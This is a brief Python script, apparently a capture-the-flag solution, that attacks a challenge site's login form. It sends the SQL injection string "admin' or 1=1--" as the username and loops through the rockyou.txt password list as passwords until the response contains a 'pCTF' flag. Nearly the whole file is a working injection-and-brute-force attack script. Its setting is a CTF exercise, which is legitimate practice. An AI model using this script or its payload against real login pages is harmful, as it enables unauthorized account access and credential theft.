import requests

# x = requests.Session()
# y = x.get('http://webchallenge.cybsec.in:8000')
# result = y.text
# ans = result[139:146].rstrip()
# print(ans)
f = open("rockyou.txt", "r")
for x in f:
    print(x.strip())
    myobj = {'username': "admin' or 1=1--", 'password': x.strip()}
    gg = requests.post('http://webchallenge.cybsec.in:9090/login',data = myobj)
    print(gg.text)
    print(gg.status_code)
    if('pCTF' in gg.text):
        break
# x.close()
